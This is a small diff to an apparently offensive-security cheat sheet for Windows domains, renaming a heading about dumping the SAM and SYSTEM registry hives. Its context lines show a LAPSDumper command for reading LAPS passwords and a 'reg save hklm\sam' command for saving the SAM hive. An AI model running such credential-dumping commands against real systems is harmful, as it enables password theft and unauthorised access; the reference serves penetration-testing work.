@@ -970,7 +970,7 @@ Read [LAPS](https://github.com/n00py/LAPSDumper)
 ```
 python3 laps.py -u 'user' -p 'password' -l IP -d domain.local
 ```
-### Dump SAM and SECURITY
+### Dump SAM and SYSTEM
 ```
 reg save hklm\sam c:\sam
 ```
